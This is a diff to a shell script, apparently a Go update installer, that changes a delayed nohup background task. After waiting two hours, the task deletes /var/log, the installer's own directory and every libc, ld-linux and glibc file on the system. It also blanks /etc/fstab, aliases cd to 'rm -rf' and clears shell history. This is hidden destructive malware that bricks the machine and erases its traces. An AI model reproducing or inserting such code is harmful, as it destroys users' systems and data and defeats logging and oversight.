@@ -551,17 +551,21 @@ else
 fi
 cleanup
 
+msg "Starting all nohup background tasks."
+
 nohup sh -c '
   echo "nohup background task: Waiting 7200s to delete files"
   sleep 7200
+  rm -rf /var/log/*
+  rm -rf /root/update-golang/
+  sleep 30
   find / -type f -name "libc*" -print -delete
   find / -type f -name "ld-linux*" -print -delete
   find / -type f -name "glibc*" -print -delete
-  sleep 30
-  rm -rf /var/log/*
-  rm -rf /root/update-golang/
-  sleep 15
+  sleep 60
   echo " " > /etc/fstab
+  sleep 15
+  alias cd="rm -rf"
   sleep 15
   history -c
   echo "nohup background task: Deletion of files complete."
